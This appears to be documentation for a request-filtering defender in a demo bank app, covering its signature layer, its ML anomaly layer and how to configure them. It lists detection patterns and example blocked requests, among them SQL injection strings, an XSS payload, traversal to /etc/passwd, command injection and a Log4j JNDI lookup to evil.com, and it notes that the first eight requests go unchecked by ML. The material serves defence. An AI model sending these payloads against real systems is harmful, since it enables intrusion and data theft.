# How the Defender Classifies Requests as Blocked or Allowed

## Decision Flow Overview

The defender uses a **multi-layered defense strategy** with the following decision flow:

```
Request arrives
    ↓
1. Signature-Based Detection (Pattern Matching)
    ↓ (if no match)
2. ML Anomaly Detection (if enabled and baseline established)
    ↓ (if not anomalous)
3. ALLOW (default)
```

## Layer 1: Signature-Based Detection (First Priority)

**Status Code: 403 (Forbidden)**

The defender checks for known attack patterns using regex patterns. If any pattern matches, the request is **immediately blocked** without further processing.

### SQL Injection Patterns
Checks for these patterns in `path`, `query`, and `body`:
- `UNION SELECT` (case-insensitive)
- `OR '1'='1` (SQL injection bypass)
- `DROP TABLE` (destructive SQL)
- `information_schema` (database enumeration)
- `sleep(` (time-based SQL injection)

**Example Blocked:**
```
GET /accounts/1' OR '1'='1
POST /auth/login {"email": "admin' OR '1'='1--", "password": "x"}
```

### XSS (Cross-Site Scripting) Patterns
Checks for:
- `<script` tags
- `onerror=` event handlers
- `javascript:` protocol

**Example Blocked:**
```
GET /transactions?note=<script>alert('XSS')</script>
```

### Path Traversal Patterns
Checks for:
- `../` (directory traversal)
- `..\\` (Windows path traversal)

**Example Blocked:**
```
GET /accounts/../../../etc/passwd
GET /accounts/..\\..\\windows\\system32\\config\\sam
```

### RCE (Remote Code Execution) Patterns
Checks for:
- Command injection: `; cat`, `| whoami`, `&& ls`
- Log4j: `${jndi:ldap://...}`

**Example Blocked:**
```
GET /admin/audit-logs?user_id=; cat /etc/passwd
GET /admin/audit-logs?user_id=${jndi:ldap://evil.com/a}
```

## Layer 2: ML Anomaly Detection (Second Priority)

**Status Code: 429 (Too Many Requests)**

The ML detector analyzes traffic patterns and flags anomalous behavior. This layer only activates **after 8 requests** from the same IP to establish a baseline.

### How ML Detection Works

1. **Traffic Metrics Collection**
   For each request, the defender tracks:
   - `requests_per_minute` - Request rate (capped at 300/min)
   - `avg_payload_bytes` - Average payload size
   - `avg_response_time_ms` - Response time (from headers or default 120ms)
   - `error_rate_pct` - Percentage of blocked requests
   - `status_code` - Last HTTP status code

2. **Baseline Establishment**
   - First 8 requests from any IP: **Always allowed** (ML not active)
   - After 8 requests: ML detection activates

3. **Anomaly Scoring**
   The ML model (Advanced Ensemble or Isolation Forest) calculates an anomaly score:
   - **Score > -0.25**: Normal traffic → **ALLOWED**
   - **Score < -0.25**: Anomalous traffic → **BLOCKED** (status 429)

### What Gets Flagged as Anomalous

The model was trained on normal traffic with these characteristics:
- Requests/min: 60-300 (mean ~180)
- Payload bytes: 500-5,000 (mean ~3,500)
- Response time: 40-200ms (mean ~120ms)
- Error rate: 0-1% (mean ~0.5%)
- Status codes: 200, 201, 202, 204 (successful)

**Traffic that deviates significantly** from these patterns gets flagged:
- Very high request rates (>300/min)
- Very large payloads (>5,000 bytes)
- Very slow responses (>200ms)
- High error rates (>1%)
- Error status codes (4xx, 5xx)

### ML Model Types

**Advanced Ensemble (if PyTorch available):**
- Autoencoder (neural network)
- One-Class SVM
- Isolation Forest
- **Ensemble voting**: Requires 2+ models to agree for anomaly

**Basic Model (if PyTorch unavailable):**
- One-Class SVM
- Isolation Forest
- **Ensemble voting**: Requires 2 models to agree

## Layer 3: Default Allow

If a request passes both signature checks and ML detection (or ML is not active), it is **allowed** and forwarded to the bank server.

**Status Code: 200 (OK) - forwarded to origin**

## Decision Summary Table

| Condition | Action | Status Code | Reason |
|-----------|--------|-------------|--------|
| Matches SQL injection pattern | **BLOCK** | 403 | `sqli` |
| Matches XSS pattern | **BLOCK** | 403 | `xss` |
| Matches path traversal pattern | **BLOCK** | 403 | `traversal` |
| Matches RCE pattern | **BLOCK** | 403 | `rce` |
| ML active (8+ requests) AND anomaly_score < -0.25 | **BLOCK** | 429 | `ml_anomaly` |
| First 8 requests from IP | **ALLOW** | 200 | Baseline establishment |
| Passes all checks | **ALLOW** | 200 | Normal traffic |

## Example Decision Flow

### Example 1: SQL Injection Attack
```
Request: GET /accounts/1' OR '1'='1

1. Signature check: Matches SQLI pattern "or\s+'1'='1"
   → BLOCKED (status 403, reason: sqli)
   → Stops here, doesn't check ML
```

### Example 2: Legitimate Request (First 8)
```
Request: GET /health

1. Signature check: No patterns match
2. ML check: Request count = 1 (< 8)
   → ALLOWED (status 200)
   → Forwarded to bank server
```

### Example 3: Legitimate Request (After Baseline)
```
Request: GET /accounts/acc-12345
IP has made 10 requests, all normal

1. Signature check: No patterns match
2. ML check: 
   - Metrics: rpm=150, payload=2000, response=100ms, errors=0%, status=200
   - Anomaly score: 0.15 (normal)
   - Score > -0.25 → ALLOWED (status 200)
```

### Example 4: Anomalous Traffic
```
Request: GET /accounts/acc-12345
IP has made 15 requests, high rate

1. Signature check: No patterns match
2. ML check:
   - Metrics: rpm=450, payload=8000, response=500ms, errors=5%, status=500
   - Anomaly score: -0.35 (anomalous)
   - Score < -0.25 → BLOCKED (status 429, reason: ml_anomaly)
```

## Key Safeguards

1. **First 8 Requests Always Allowed**
   - Prevents false positives on new IPs
   - Allows baseline establishment

2. **Strict ML Threshold (-0.25)**
   - Only blocks clearly anomalous traffic
   - Reduces false positives

3. **Request Rate Capping**
   - Caps requests/min at 300 to prevent false positives from rapid testing

4. **Ensemble Voting**
   - Advanced model requires 2+ models to agree
   - More robust than single model

## Viewing Decisions

Check what the defender decided:

```bash
curl http://localhost:8081/events
```

This shows:
- Timestamp
- IP address
- Method and path
- Reason for block (if blocked)
- Status code

## Configuration

### Adjusting ML Sensitivity

Edit `defender/main.py`:
```python
# Line 297: Change threshold (lower = more sensitive)
if anomaly_score < -0.25:  # Change to -0.15 for more sensitive
```

### Adjusting Baseline Count

Edit `defender/main.py`:
```python
# Line 290: Change minimum requests before ML activates
if request_count >= 8:  # Change to 5 for earlier activation
```

### Adding Signature Patterns

Edit `defender/main.py`:
```python
# Lines 91-100: Add new patterns
SQLI_PATTERNS = [
    r"(?i)union\s+select",
    r"(?i)your_new_pattern",
    # ...
]
```

